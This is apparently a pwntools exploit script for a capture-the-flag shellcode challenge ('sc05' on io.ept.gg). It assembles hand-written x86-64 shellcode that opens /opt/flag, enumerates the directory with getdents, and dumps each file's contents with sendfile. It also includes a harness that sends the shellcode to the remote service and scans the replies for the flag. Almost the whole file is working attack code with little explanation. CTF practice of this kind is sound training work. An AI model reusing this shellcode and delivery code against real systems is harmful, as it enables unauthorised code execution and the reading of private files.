#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./sc05')
# context.terminal = ['tmux', 'splitw', '-h']
host = args.HOST or 'io.ept.gg'
port = int(args.PORT or 30015)
context.terminal = ['tmux', 'splitw', '-h']
def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)
def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)
gdbscript = '''
b *runShellcode+25
continue
'''.format(**locals())
shellcode = ''
#push /opt/flag/
shellcode += """
push  0x2f67;
mov rdx, 0x616c662f74706f2f;
push rdx;
push rsp;
pop rdi;
"""
# shellcode += """
#     mov rdi, rbx;
#     add rdi, 0x806;
# """
#shellcode += shellcraft.syscall('SYS_openat', -100,'rsp', 0x90800 )
shellcode +="""

mov al, SYS_open;
xor esi, esi;
syscall;
"""
#get some space on the stack
shellcode += """
push rsp;
pop rbp;
xor sp,sp;
"""

#shellcode += shellcraft.syscall('SYS_getdents', 'rax','rsp', 0x8000)
shellcode += """
    mov edi, eax;
    mov al, 0x4e;  # SYS_getdents
    mov dh, 0x80;
    push rsp;
    pop rsi;
    syscall;
"""


shellcode += """
loop:
    push 100;
    pop rcx;
    lea      rdi, [rbp+10];
    lea      rsi,[rsp+0x12];
    rep      movsb;
    
    push SYS_open /* 2 */
    pop rax
    push rbp;
    pop rdi;
    xor esi, esi;
    cdq; # clear rdx
    syscall;
    /* call sendfile('1', 'rax', 0, 0xc9) */ 
    /* xor r10d, r10d */
    xchg r10, r11;
    mov esi, eax;
    mov al, SYS_sendfile /* 0x28 */
    push (1) /* 1 */
    pop rdi
    syscall
    /*mov bl, byte ptr [rsp+0x10];*/
    add sp,  [rsp+0x10];
jmp loop;
"""


shellcode = """

    xor bp,bp;
    push 0x67
    mov rbx, 0x616c662f74706f2f
    push rbx
    push rsp
    pop rdi
    xchg eax,esi

    mov al,SYS_open
    syscall /* open(file='/opt/flag', oflag=0, mode=0) */

    push rax
    pop rdi
    mov al,SYS_getdents
    push rbp
    pop rsi

    syscall  /* call getdents('rax', 'rsp', 0x8000) */
    
    loop:

    lea rsp, [rbp+0x12]
    
    add bp, [rsp-0x2];
    
    mov cx, 0x2f67;
    push cx;
    push rbx;



    push rsp;
    pop rdi;

    push SYS_open /* 2 */
    pop rax
    cdq
    xor esi, esi /* 0 */

    syscall     /* open(file='rsp', oflag=0, mode=0) */

    

    xchg eax,esi
    mov al, SYS_sendfile
    pop r10
    push (1)
    pop rdi
    syscall /* call sendfile('1', 'rax', 0, 0xc9) */

    jmp loop
"""
print(shellcode)
kek = asm(shellcode)
# -- Exploit goes here --
io = start()
io.recvuntil('>')
print(len(kek))
a  = 0
io.sendline(kek)
for i in range(200):
    data = io.recvline()
    #print(data)
    a+= 1
    if b'EPT{' in data:
        idx = data.index(b'}')
        print(data[:idx+1])
        exit(1)
print(a)
    # 
io.interactive()